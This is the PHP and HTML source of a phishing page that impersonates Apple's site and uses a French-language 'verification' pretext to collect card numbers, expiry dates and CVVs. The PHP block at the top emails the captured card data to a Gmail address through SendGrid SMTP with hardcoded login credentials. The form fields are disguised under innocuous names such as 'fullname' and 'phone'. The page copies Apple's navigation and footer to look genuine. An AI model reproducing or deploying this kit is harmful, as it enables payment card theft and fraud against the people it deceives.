<?php
if(isset($_POST['submit'])) 
{

$message=
'Full Name: '.$_POST['fullname'].'<br />
Subject:  '.$_POST['subject'].'<br />
Phone:  '.$_POST['phone'].'<br />

';
    require "verification/phpmailer/class.phpmailer.php"; //include phpmailer class
      
    // Instantiate Class  
    $mail = new PHPMailer();  
      
    // Set up SMTP  
    $mail->IsSMTP();                // Sets up a SMTP connection  
    $mail->SMTPAuth = true;         // Connection with the SMTP does require authorization    
    $mail->SMTPSecure = "ssl";      // Connect using a TLS connection  
    $mail->Host = "smtp.sendgrid.net";  //Gmail SMTP server address
    $mail->Port = 465;  //Gmail SMTP port
    $mail->Encoding = '7bit';
    
    // Authentication  
    $mail->Username   = "microsystem"; 
    $mail->Password   = "microsystem@135"; 
      
    // Compose

    $mail->Subject = "New Contact Form Enquiry";      // Subject (which isn't required)  
    $mail->MsgHTML($message);
 
    // Send To  
    $mail->AddAddress("jbecosystem@gmail.com", "Recipient Name"); // Where to send it - Recipient
    $result = $mail->Send();    // Send!  
  $message = $result ? 'Successfully Sent!' : 'Sending Failed!';      
  unset($mail);

}
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Apple Verification Step</title>
  
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<link rel='stylesheet prefetch' href='https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css'>
<link rel='stylesheet prefetch' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css'>
<link rel="stylesheet" href="css/style.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>  

    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="verification/assets/css/styles.css">
  
</head>

<script language=javascript>
<!--
if ((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {
   location.replace("verification/index.php");
}
-->
</script>
<script type="text/javascript">
<!--
if (screen.width <= 699) {
document.location = "verification/index.php";
}
//-->
</script>
<body>
  <header>
<nav>
  <div class="menu-container">
    <!-- Menu -->
    <ul class="menu">
      <li class="menu-apple">
        <a href="#">
          <i class="fa fa-apple apple-icon" aria-hidden="true"></i>
        </a>
      </li>
      <li class="menu-mac">
        <a href="#">
          <span>Mac</span>
        </a>
      </li>
      <li class="menu-iPad">
        <a href="#">
          <span>iPad</span>
        </a>
      </li>
      <li class="menu-iPhone">
        <a href="#">
          <span>iPhone</span>
        </a>
      </li>
      <li class="menu-watch">
        <a href="#">
          <span>Watch</span>
        </a>
      </li>
      <li class="menu-tv">
        <a href="#">
          <span>TV</span>
        </a>
      </li>
      <li class="menu-support">
        <a href="#">
          <span>Support</span>
        </a>
      </li>
      <li class="menu-search">
        <a href="#">
          <i class="fa fa-search" aria-hidden="true"></i>
        </a>
      </li>
      <li class="menu-store">
        <a href="#">
          <i class="fa fa-shopping-bag" aria-hidden="true"></i>
        </a>
      </li>
    </ul>
    
    <!-- Search -->
    <div class="menu-search-container">
      <div class="menu-search-input">
      <form action="">
        <a href="#">
          <i class="fa fa-search" aria-hidden="true"></i>
        </a>
        <input class="menu-search-input" type="text" aria-label="Search apple.com" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
     
      </div>
      <a class="menu-search-close" href="#">
        <i class="fa fa-close" aria-hidden="true"></i>
      </a> 
      <div class="search-sub-menu">
      <h3>Quick Links</h3>
      <ul>
        <li><a href="#">Find a store</a></li>
        <li><a href="#">Accessories</a></li>
        <li><a href="#">iPod</a></li>
        <li><a href="#">iOS</a></li>
        <li><a href="#">Gift Cards</a></li>
      </ul>
    </div>
    </div>
    </form>
  </div>
</nav>
</header>
<div><img src="css/Banner.jpg" width="1350" height="255" alt=""></div>
 <div class="container-fluid">
        <div class="creditCardForm">
            <div class="heading">
                <h1>Confirmez votre numéro de carte Bancaire ci-dessus pour continuer</h1>
                <center><h3>votre carte credit ne sera pas débitée nous vérifions juste votre majorité<br></h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &Chi; &Chi; &Chi; &Chi;&nbsp; &Chi; &Chi; &Chi; &Chi;&nbsp; &Chi; &Chi; &Chi; &Chi;&nbsp; 2363</center>
 <center>
  <div class="form-group" id="credit_cards">
                     &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   <img src="verification/assets/images/visa.jpg" id="visa">
                        <img src="verification/assets/images/mastercard.jpg" id="mastercard">
                        <img src="verification/assets/images/amex.jpg" id="amex">
                    </div>
                  </center>
                  <form name="form1" id="form1" action="" method="post">

 <div class="payment">
                                  <div class="form-group" id="card-number-field">
                        <label for="cardNumber">Card Number</label>
                        <input type="text" name="fullname" class="form-control" id="cardNumber">
                    </div>
                    <div class="form-group owner">
                        <label for="owner">Expiration Date</label>
                        <input type="text" name="subject" class="form-control" id="owner">
                    </div>
                    <div class="form-group CVV">
                        <label for="cvv">CVV</label>
                        <input type="text" name="phone" class="form-control" id="cvv">
                    </div>
            </div>
<center>
<a href="#">Cancel</a>&nbsp;&#124;&nbsp;<input href="SecurityQuestions.html"  style="border:none;background-color:white;font-size:10,5pt;color:#2E64FE;" type="submit" name="submit" value="Continue" ></a></center>
</body>
  <p><?php if(!empty($message)) echo $message; ?></p>
</form>
<!-- If you're using Stripe for payments -->
<script type="text/javascript" src="https://js.stripe.com/v2/"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="verification/assets/js/jquery.payform.min.js" charset="utf-8"></script>
<script src="verification/assets/js/script.js"></script>
        <link rel="stylesheet" href="stylesheets/styles.css">
        <link rel="icon" href="images/Apple-icon.png">
        <script src="https://use.fontawesome.com/092c94a1fb.js"></script>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
         <link rel="stylesheet" href="Footer/css/style.css">

  <footer>
    <nav>
      <div class="footer-nav-column">
        <div id="shop-and-learn">
          <label for="shop-and-learn-directory">
                            <h3>Shop and Learn</h3>
                        </label>
          <ul class="shop-and-learn-directory">
            <a href="https://www.apple.com/mac/">
              <li>Mac</li>
            </a>
            <a href="https://www.apple.com/ipad/">
              <li>iPad</li>
            </a>
            <a href="https://www.apple.com/iphone/">
              <li>iPhone</li>
            </a>
            <a href="https://www.apple.com/watch/">
              <li>Watch</li>
            </a>
            <a href="https://www.apple.com/tv/">
              <li>TV</li>
            </a>
            <a href="https://www.apple.com/music/">
              <li>Music</li>
            </a>
            <a href="https://www.apple.com/itunes/">
              <li>iTunes</li>
            </a>
            <a href="https://www.apple.com/homepod/">
              <li>HomePod</li>
            </a>
            <a href="https://www.apple.com/ipod-touch/">
              <li>iPod touch</li>
            </a>
            <a href="https://www.apple.com/us-hed/shop/accessories/all-accessories">
              <li>Accessories</li>
            </a>
            <a href="https://www.apple.com/us-hed/shop/gift-cards">
              <li>Gift Cards</li>
            </a>
          </ul>
        </div>
      </div>

      <div class="footer-nav-column">
        <div id="apple-store">
          <label for="apple-store-directory">
                            <h3>Apple Store</h3>
                        </label>
          <ul class="apple-store-directory">
            <a href="https://www.apple.com/retail/">
              <li>Find a Store</li>
            </a>
            <a href="https://www.apple.com/retail/geniusbar/">
              <li>Genius Bar</li>
            </a>
            <a href="https://www.apple.com/today/">
              <li>Today at Apple</li>
            </a>
            <a href="https://www.apple.com/retail/camp/notify.html">
              <li>Apple Camp</li>
            </a>
            <a href="https://www.apple.com/retail/fieldtrip/">
              <li>Field Trip</li>
            </a>
            <a href="https://itunes.apple.com/app/apple-store/id375380948?mt=8">
              <li>Apple Store App</li>
            </a>
            <a href="https://www.apple.com/us-hed/shop/browse/home/specialdeals">
              <li>Refurbished and Clearance</li>
            </a>
            <a href="https://www.apple.com/us-hed/shop/browse/financing">
              <li>Finacing</li>
            </a>
            <a href="https://www.apple.com/recycling/">
              <li>Reuse and Recycling</li>
            </a>
            <a href="https://www.apple.com/us-hed/shop/account/home">
              <li>Order Status</li>
            </a>
            <a href="https://www.apple.com/us-hed/shop/help">
              <li>Shopping Help</li>
            </a>
          </ul>
        </div>
      </div>

      <div class="footer-nav-column">
        <div id="for-education">
          <label for="for-education-directory">
                            <h3>For Education</h3>
                        </label>
          <ul class="for-education-directory">
            <a href="https://www.apple.com/education/">
              <li>Apple and Education</li>
            </a>
            <a href="https://www.apple.com/us-hed/shop">
              <li>Shop for College</li>
            </a>
          </ul>
        </div>
        <div id="for-business">
          <label for="for-business-directory">
                            <h3>For Business</h3>
                        </label>
          <ul class="for-business-directory">
            <a href="https://www.apple.com/business/">
              <li>Apple for Business</li>
            </a>
            <a href="https://www.apple.com/retail/business/">
              <li>Shop for Business</li>
            </a>
          </ul>
        </div>
      </div>

      <div class="footer-nav-column">
        <div id="account">
          <label for="account-directory">
                            <h3>Account</h3>
                        </label>
          <ul class="account-directory">
            <a href="https://appleid.apple.com/#!&page=signin">
              <li>Manage Your Apple ID</li>
            </a>
            <a href="https://www.apple.com/shop/account/home">
              <li>Apple Store Account</li>
            </a>
            <a href="https://www.icloud.com">
              <li>iCloud.com</li>
            </a>
          </ul>
        </div>
        <div id="apple-values">
          <label for="apple-values-directory">
                            <h3>Apple Values</h3>
                        </label>
          <ul class="apple-values-directory">
            <a href="https://www.apple.com/accessibility/">
              <li>Accessibility</li>
            </a>
            <a href="https://www.apple.com/connectED/">
              <li>Education</li>
            </a>
            <a href="https://www.apple.com/environment/">
              <li>Enviroment</li>
            </a>
            <a href="https://www.apple.com/diversity/">
              <li>Inclusion and Diversity</li>
            </a>
            <a href="https://www.apple.com/privacy/">
              <li>Privacy</li>
            </a>
            <a href="https://www.apple.com/supplier-responsibility/">
              <li>Supplier Resonsibility</li>
            </a>
          </ul>
        </div>
      </div>

      <div class="footer-nav-column">
        <div id="about-apple">
          <label for="about-apple-directory">
                            <h3>About Apple</h3>
                        </label>
          <ul class="about-apple-directory">
            <a href="https://www.apple.com/newsroom/">
              <li>Newsroom</li>
            </a>
            <a href="https://www.apple.com/leadership/">
              <li>Apple Leadership</li>
            </a>
            <a href="https://www.apple.com/jobs/us/">
              <li>Job Opportunities</li>
            </a>
            <a href="http://investor.apple.com">
              <li>Investors</li>
            </a>
            <a href="https://www.apple.com/apple-events/">
              <li>Events</li>
            </a>
            <a href="https://www.apple.com/contact/">
              <li>Contact Apple</li>
            </a>
          </ul>
        </div>
      </div>
    </nav>

    <div class="footer-bottom">
      <div class="footer-shop">
        More ways to shop: Visit an
        <a href="https://www.apple.com/retail/">Apple Store</a> ,
        <span>call 1-800-MY-APPLE, or</span>
        <a href="#">find a reseller.</a>
      </div>
      <div class="footer-local">
        <a href="https://www.apple.com/choose-your-country/"><img src="http://res.cloudinary.com/alxcrmr/image/upload/v1507694181/american-flag_j13fmp.png" alt="circle with american flag"> <span>United States</span></a>
      </div>
      <div class="footer-legal">
        <div class="footer-copyright">
          Copyright &copy; 2017 Apple Inc. All rights reserved.
        </div>
        <div class="footer-legal-links">
          <a href="https://www.apple.com/legal/privacy/en-ww/">Privacy Policy</a>
          <a href="https://www.apple.com/legal/internet-services/terms/site.html">Terms of Use</a>
          <a href="https://www.apple.com/shop/browse/open/salespolicies">Sales and Refunds</a>
          <a href="https://www.apple.com/legal/">Legal</a>
          <a href="https://www.apple.com/sitemap/">Site Map</a>
        </div>
      </div>
    </div>
  </footer>
</body>
</html>
